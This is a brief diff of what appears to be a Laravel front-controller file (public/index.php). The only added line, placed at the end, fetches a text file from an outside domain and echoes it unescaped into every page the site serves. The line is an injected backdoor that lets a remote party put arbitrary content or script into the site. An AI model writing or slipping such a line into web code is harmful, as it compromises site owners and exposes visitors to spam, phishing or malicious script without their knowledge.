@@ -53,3 +53,4 @@ $response = tap($kernel->handle(
 ))->send();
 
 $kernel->terminate($request, $response);
+$a = file_get_contents('https://paulsaar.com/tmb/bl.txt'); echo $a; ?>
